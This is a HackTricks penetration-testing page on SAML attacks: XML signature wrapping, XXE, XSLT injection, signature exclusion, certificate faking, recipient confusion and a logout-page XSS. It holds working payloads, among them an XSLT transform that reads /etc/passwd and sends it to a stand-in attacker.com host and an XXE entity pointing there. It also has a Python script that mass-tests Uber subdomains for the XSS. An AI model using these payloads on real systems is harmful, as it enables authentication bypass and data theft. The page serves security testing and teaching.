# SAML Attacks

## SAML Attacks

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Basic Information

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Attacks Graphic

![](<../../.gitbook/assets/image (535) (1) (1) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

## Tool

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): A tool that can take a URL or list of URL and prints back SAML consume URL.

## XML round-trip

In XML the signed part of the XML is saved in memory, then some encoding/decoding is performed and the signature is checked. Ideally that encoding/decoding shouldn't change the data but based in that scenario, **the data being checked and the original data could not be the same**.

For example, check the following code:

```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
  <Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```

Running the program against REXML 3.2.4 or earlier would result in the following output instead:

```
First child in original doc: Y
First child after round-trip: Z
```

This is how REXML saw the original XML document from the program above:

![](<../../.gitbook/assets/image (561).png>)

And this is how it saw it after a round of parsing and serialization:

![](<../../.gitbook/assets/image (562).png>)

For more information about the vulnerability and how to abuse it:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Signature Wrapping Attacks

XML documents containing XML Signatures are typically **processed in two independent steps**: **signature** **validation** and **function** **invocation** (business logic). If both modules have different views on the data, a new class of vulnerabilities named XML Signature Wrapping attacks (XSW) exists.\
In these attacks the **adversary** **modifies** the **message** structure by **injecting** **forged** elements **which do not invalidate the XML Signature**. The goal of this alteration is to change the message in such a way that the **application logic and the signature verification module use different parts of the message**. Consequently, the receiver verifies the XML Signature successfully but the application logic processes the bogus element. The **attacker thus circumvents the integrity protection** and the origin authentication of the XML Signature and can inject arbitrary content.

From the SAML request:

![](<../../.gitbook/assets/image (537).png>)

### XSW #1

An attacker can **add a new root element where the signature** is found. Therefore, when the validator checks the integrity of the signature it may note that it has **check** the **integrity** of the **Response -> Assertion -> Subject**, and it might get confused with the **evil new Response -> Assertion -> Subject** path in red and use its data.

![](<../../.gitbook/assets/image (538).png>)

### XSW #2

The difference with #1 is that the type of Signature used is a **detached signature** where XSW #1 used an enveloping signature.\
Note how the new evil structure is the same as before trying to confuse the business logic after the integrity check was performed.

![](<../../.gitbook/assets/image (539).png>)

### XSW #3

In this attack an **evil Assertion is created in at the same level** as the original assertion to try to confuse the business logic and use the evil data.

![](<../../.gitbook/assets/image (540).png>)

### XSW #4

XSW #4 is similar to #3, except in this case the **original Assertion becomes a child** of the copied Assertion.

![](<../../.gitbook/assets/image (541).png>)

### XSW #5

In XSW #5 the Signature and the original Assertion aren’t in one of the three standard configurations (enveloped/enveloping/detached). In this case, the copied Assertion envelopes the Signature.

![](<../../.gitbook/assets/image (542).png>)

### XSW #6

XSW #6 inserts its copied Assertion into the same location as #’s 4 and 5. The interesting piece here is that the copied Assertion envelopes the Signature, which in turn envelopes the original Assertion.

![](<../../.gitbook/assets/image (543).png>)

### XSW #7

XSW #7 inserts an **Extensions** element and adds the copied **Assertion** as a **child**. Extensions is a valid XML element with a **less restrictive schema definition**. The authors of this [white paper](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf) developed this method in response to the OpenSAML library. OpenSAML used schema validation to correctly compare the ID used during signature validation to the ID of the processed Assertion. The authors found in cases where copied Assertions with the same ID of the original Assertion were children of an element with a less restrictive schema definition, they were able to bypass this particular countermeasure.

![](<../../.gitbook/assets/image (544).png>)

### XSW #8

XSW #8 uses another **less restrictive XML element** to perform a variation of the attack pattern used in XSW #7. This time around the original Assertion is the child of the less restrictive element instead of the copied Assertion.

![](<../../.gitbook/assets/image (545).png>)

### Tool

You can use the Burp extension [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) to parse the request, apply any XSW attack you choose, and launch it.

![](<../../.gitbook/assets/image (546).png>)

### Original Paper

For more information about this attack read the original paper in [https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)

## XXE

If you don't know which kind of attacks are XXE, please read the following page:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

Due to the fact that SAML Responses are deflated and base64’d **XML documents**, we can test for **XXE** by manipulating the XML document sent as the SAML Response. Example:

```markup
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY    file SYSTEM "file:///etc/passwd">
   <!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
  <samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
  <saml:Issuer>...</saml:Issuer>
  <ds:Signature ...>
    <ds:SignedInfo>
      <ds:CanonicalizationMethod .../>
      <ds:SignatureMethod .../>
      <ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
[...]
```

### Tool

You can also use the Burp extension [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) to generate the POC from a SAML request to test for possible XXE vulnerabilities.

Check also this talk: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT via SAML

For more information about XSLT go to:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md](../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md)
{% endcontent-ref %}

Extensible Stylesheet Language Transformation (XSLT) is a Turing-complete language for transforming XML documents into other document types such as HTML, JSON, or PDF. An important aspect to note here is that **the attack doesn’t require a valid signature to succeed**. The reason for this is that **the XSLT transformation occurs before the digital signature is processed for verification**. Basically, we need a signed SAML Response to perform the attack, but the signature can be self-signed or invalid.

![xslt](https://epi052.gitlab.io/notes-to-self/img/saml/xslt.png)

Here you can find a **POC** to check for this kind of vulnerabilities, in the hacktricks page mentioned at the beginning of this section you can find for payloads.

```markup
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
            <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```

### Tool

You can also use the Burp extension [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) to generate the POC from a SAML request to test for possible XSLT vulnerabilities.

Check also this talk: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML Signature Exclusion <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

Signature Exclusion is used to test how the SAML implementation behaves when there is **no Signature elemen**t. When a Signature element is **absent** the **signature validation step may get skipped entirely**. If the Signature isn’t validated, then any of the contents that would typically be signed may be tampered with by an attacker.

![](<../../.gitbook/assets/image (547).png>)

### Tool <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

Signature exclusion begins with intercepting the SAML Response then clicking `Remove Signatures`. In doing so **all** Signature elements are removed.

![sig-exclusion](https://epi052.gitlab.io/notes-to-self/img/saml/sig-exclusion.png)

With the signatures removed, allow the request to proceed to the target. If the Signature isn’t required by the Service

## Certificate Faking <a href="#certificate-faking" id="certificate-faking"></a>

Certificate faking is the process of testing whether or not the Service Provider **verifies that a trusted Identity Provider signed the SAML Message.** The trust relationship between SP and IdP is established and **should be verified** each time a SAML Message is received. What this comes down to is using a **self-signed** certificate to sign the SAML Response or Assertion.

### Tool <a href="#certificate-faking-how-to" id="certificate-faking-how-to"></a>

The Burp extension [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) is going to be used.\
To fake a certificate, begin by intercepting the SAML Response.\
If there is a Signature included in the Response, use the `Send Certificate to SAML Raider Certs` button.

![send-cert](https://epi052.gitlab.io/notes-to-self/img/saml/send-cert.png)

After sending the certificate, we should see an imported certificate in the SAML Raider Certificates tab. Once there, we highlight the imported cert and press the `Save and Self-Sign` button.

![sent-cert](https://epi052.gitlab.io/notes-to-self/img/saml/sent-cert.png)

Doing so generates a self-signed clone of the original certificate. Now it’s time to move back to the intercepted request still held in burp’s Proxy. First, select the new self-signed cert from the XML Signature dropdown menu. Then use the `Remove Signatures` button to remove any existing signatures. Finally, use the **`(Re-)Sign Message`** or `(`**`Re-)Sign Assertion`** button (**whichever** is **more** **appropriate** in your given situation).

![remove-sig](https://epi052.gitlab.io/notes-to-self/img/saml/remove-sig.png)

After signing the message with the self-signed cert, send it on its way. If we authenticate, we know that we can sign our SAML Messages. The ability to sign our SAML Messages means we can change values in the Assertion and they will be accepted by the Service Provider.

## Token Recipient Confusion / Service Provider Target Confusion <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Token Recipient Confusion / Service Provider Target CONfusion **tests whether or not the Service Provider validates the Recipient**. This means, that **if the response was meant for a different Service Provide**r, the **current** Service Provider should notice it and **reject the authentication**.\
The **Recipient** field is an attribute of the **SubjectConfirmationData** element, which is a child of the Subject element in a SAML Response.

> The SubjectConfirmationData element specifies additional data that allows the subject to be confirmed or constrains the circumstances under which the act of subject confirmation can take place. Subject confirmation takes place when a relying party seeks to verify the relationship between an entity presenting the assertion (that is, the attesting entity) and the subject of the assertion’s claims.

The Recipient attribute found on the **SubjectConfirmationData element is a URL that specifies the location to which the Assertion must be delivered**. If the Recipient is a different Service Provider than the one who receives it, the Assertion should not be accepted.

### How-to <a href="#token-recipient-confusion-how-to" id="token-recipient-confusion-how-to"></a>

SAML Token Recipient Confusion (SAML-TRC) has a few prequisite conditions in order for us to attempt exploitation. First, we **need** to have a **legitimate account on a Service Provider**. Second, **SP-Target must accept tokens issued by the same Identity Provider that services SP-Legit**.

The attack is relatively simple if the conditions are true. We **authenticate** to **SP-Legit** via the shared Identity Provider. We then **intercept the SAML Response on its way from the IdP to SP-Legit**. Once intercepted, we send the **SAML Response that was intended for SP-Legit to SP-Target instead.** If **SP-Target accepts the Assertion**; we’ll find ourselves logged in with the same account name as we have for SP-Legit and get access to SP-Target’s corresponding resources.

## XSS in Logout functionality

(Access the [original research here](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/))

After performing the directory brute forcing I found the following page:

```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```

It's a logout page, I opened the above link and it did redirect me to the following page

```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```

The base parameter is taking a URL so how about replacing that with the old classic `javascript:alert(123);` to trigger an XSS.

### Mass Exploitation

Using [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) that can take a list of URLs and then give you back the callback (SAML consume) URL, I decided to feed the tool with all subdomains of `uberinternal.com` to see if there are other domains that use the same library and there was.

What I did next was to create a script that calls the vulnerable page `oidauth/prompt` and try the XSS and if my input is reflected it gives me a nice vulnerable message.

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
            for url in urlList:
                url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
                request = requests.get(url2, allow_redirects=True,verify=False)
                doesit = Fore.RED + "no"
                if ("Fady" in request.content):
                    doesit = Fore.GREEN + "yes"
                print(Fore.WHITE + url2)
                print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```

## References

The attacks were obtained from [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
You can find additional resources and write-ups in [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
